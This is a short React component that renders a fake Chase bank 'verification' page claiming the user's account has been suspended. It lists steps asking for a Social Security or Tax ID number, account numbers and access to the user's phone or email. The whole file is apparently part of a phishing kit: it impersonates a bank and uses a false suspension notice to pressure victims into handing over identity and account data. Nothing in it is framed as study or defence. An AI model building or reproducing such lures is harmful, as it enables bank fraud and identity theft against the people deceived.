import checkout1 from "../assets/checkout-1.png";
import checkout2 from "../assets/checkout-2.png";
import checkout3 from "../assets/checkout-3.png";


const CheckoutProgress = () => {
  return (
    <>
     <section className="section section--checkout">
  <div className="section__content section__content--progress">
    <h3 className="section__heading section__heading--primary">Verification</h3>
    <div className="section__progress" />
    <h3 className="section__heading section__heading--secundary">
      Rhis Chase Account Has Been Suspended
    </h3>
    <p className="section__paragraph">It should only take a few minutes.</p>
    <div className="section__steps">
      <div className="section__step">
        <img src={checkout1} alt="step-1" />
        <p className="section__paragraph">
          Your Social Security number or Tax ID number
        </p>
      </div>
      <div className="section__step">
        <img src={checkout2} alt="step-2" />
        <p className="section__paragraph">Any account or application number</p>
      </div>
      <div className="section__step">
        <img src={checkout3} alt="step-3" />
        <p className="section__paragraph">
          Access to the phone or email you told us
        </p>
      </div>
    </div>
  </div>
</section>

    </>
  );
};
export default CheckoutProgress;
